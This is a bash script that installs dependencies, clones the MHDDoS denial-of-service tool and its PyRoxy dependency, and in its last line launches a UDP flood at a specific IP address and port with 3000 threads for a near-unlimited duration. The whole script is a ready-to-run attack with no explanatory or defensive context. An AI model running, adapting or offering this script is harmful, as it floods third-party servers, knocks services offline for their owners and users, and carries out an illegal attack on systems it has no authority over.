#!/bin/bash
apt update && apt install -y python3 python3-pip git build-essential
git clone https://github.com/MatrixTM/MHDDoS.git
cd MHDDoS
pip install -r requirements.txt --break-system-packages
pip3 install cloudscraper impacket yarl psutil requests PySocks --break-system-packages -t .

# 4. Fix PyRoxy (The "Local Move" Trick)
rm -rf PyRoxy
git clone https://github.com/MatrixTM/PyRoxy.git temp_pyroxy
cp -r temp_pyroxy/PyRoxy .
rm -rf temp_pyroxy
python3 start.py UDP 40.160.20.9:16261 3000 99999999999
